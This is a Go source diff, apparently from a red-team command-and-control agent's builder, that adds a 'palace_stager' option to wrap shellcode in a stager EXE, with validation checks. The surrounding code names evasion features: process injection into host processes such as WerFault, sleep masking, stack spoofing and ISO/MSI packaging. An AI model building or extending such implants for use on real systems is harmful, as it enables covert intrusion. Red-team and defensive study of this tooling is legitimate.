@@ -60,6 +60,7 @@ type buildOpts struct {
 	palaceInject   string
 	palaceHosts    string
 	palaceSpec     string
+	palaceStager   bool
 	packaging      string
 	packagePW      string
 	msiApp         string
@@ -230,6 +231,7 @@ func parseBuildParams(bp *agentstructs.BuildParameters) (buildOpts, error) {
 		{"palace_hooks", &o.palaceHooks},
 		{"palace_sleepmask", &o.palaceSleepMsk},
 		{"palace_spoof", &o.palaceSpoof},
+		{"palace_stager", &o.palaceStager},
 	} {
 		if *p.dest, err = boolParam(bp, p.name); err != nil {
 			return fail(err)
@@ -255,11 +257,20 @@ func parseBuildParams(bp *agentstructs.BuildParameters) (buildOpts, error) {
 	}
 	o.palaceSpec = fileParam(bp, "palace_spec")
 	if o.loader == "palace" {
-		if !o.shellcode {
-			return fail(fmt.Errorf("loader=palace needs shellcode=true"))
+		if !o.shellcode && !o.palaceStager {
+			return fail(fmt.Errorf("loader=palace needs shellcode=true or palace_stager=true"))
+		}
+		if o.shellcode && o.palaceStager {
+			return fail(fmt.Errorf("palace_stager needs shellcode=false (.bin and stager EXE are exclusive outputs)"))
 		}
 		if o.arch != "AMD_x64" {
 			return fail(fmt.Errorf("loader=palace supports AMD_x64 only"))
+		}
+		if o.palaceStager && o.packaging != "none" {
+			return fail(fmt.Errorf("palace_stager needs package=none"))
+		}
+		if o.palaceStager && o.sign != "none" {
+			return fail(fmt.Errorf("palace_stager needs sign=none"))
 		}
 		// Go's preemptive scheduler breaks inline hooks, sleep masking
 		// and stack spoofing (goroutines preempt mid-hook, run
@@ -277,6 +288,9 @@ func parseBuildParams(bp *agentstructs.BuildParameters) (buildOpts, error) {
 		}
 		if o.palaceInject != "self" {
 			return fail(fmt.Errorf("palace_inject=host needs loader=palace"))
+		}
+		if o.palaceStager {
+			return fail(fmt.Errorf("palace_stager needs loader=palace"))
 		}
 	}
 	if o.isoAutorun && o.packaging != "iso" {
@@ -375,6 +389,7 @@ func buildParameters() []agentstructs.BuildParameter {
 		choose("palace_inject", "Palace: run shellcode in self or inject into a sacrificial host process.", []string{"self", "host"}, "self"),
 		str("palace_hosts", "Palace: comma-separated host fallback order for palace_inject=host (default RuntimeBroker,SgrmBroker,WerFault,dllhost,notepad)."),
 		file("palace_spec", "Palace: custom spec file override (optional, needs loader=palace)."),
+		boolean("palace_stager", "Palace: wrap the blob in a stager EXE instead of emitting raw .bin (needs loader=palace, shellcode=false).", false),
 		choose("package", "Wrap the EXE into a container.", []string{"none", "zip", "iso", "img", "vhd", "7z", "msi"}, "none"),
 		str("package_password", "Password for 7z packaging (optional)."),
 		str("msi_app_name", "MSI product name (optional)."),
